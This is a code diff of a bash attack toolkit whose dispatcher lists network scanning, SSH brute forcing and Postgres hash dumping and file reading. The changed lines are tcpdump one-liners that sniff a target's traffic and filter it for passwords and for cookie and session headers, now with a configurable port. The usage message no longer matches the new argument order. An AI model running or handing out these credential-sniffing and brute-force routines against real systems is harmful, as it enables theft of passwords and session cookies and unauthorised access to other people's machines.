@@ -22,11 +22,11 @@ scan_ssh_auth_methods() {
 }
 
 capture_password_traffic() {
-    sudo tcpdump -s 0 -A -n -l host "$1" and port 8000 | egrep -i "password"
+    sudo tcpdump -s 0 -A -n -l host "$1" and port "$2" | egrep -i "password"
 }
 
 capture_cookies_traffic() {
-    sudo tcpdump -nn -A -s0 -l host "$1" and port 8000 | egrep -i 'Set-Cookie|Host:|Cookie:'
+    sudo tcpdump -nn -A -s0 -l host "$1" and port "$2" | egrep -i 'Set-Cookie|Host:|Cookie:'
 }
 
 brute_force_ssh() {
@@ -59,19 +59,20 @@ postgres_readfile() {
 
 
 # Obsługa argumentów i wywołanie odpowiednich funkcji
-if [ "$#" -ne 2 ]; then
+if [ "$#" -ne 3 ]; then
     echo "Usage: $0 <target_ip> <function>"
     echo "Functions available: scan_ports, scan_services, scan_ssh_auth_methods, capture_password_traffic, capture_cookies_traffic, brute_force_ssh dump_hash_user_postgres
     dump_schema_postgres postgres_readfile"
     exit 1
 fi
 
-target_ip="$1"
-function_name="$2"
+function_name="$1"
+target_ip="$2"
+target_port="$3"
 
 case "$function_name" in
     "scan_network")
-        scan_network "$target_ip"
+        scan_network "$target_ip" 
         ;;
     "scan_ports")
         scan_ports "$target_ip"
@@ -83,10 +84,10 @@ case "$function_name" in
         scan_ssh_auth_methods "$target_ip"
         ;;
     "capture_password_traffic")
-        capture_password_traffic "$target_ip"
+        capture_password_traffic "$target_ip" "$target_port"
         ;;
     "capture_cookies_traffic")
-        capture_cookies_traffic "$target_ip"
+        capture_cookies_traffic "$target_ip" "$target_port"
         ;;
     "brute_force_ssh")
         brute_force_ssh "$target_ip"
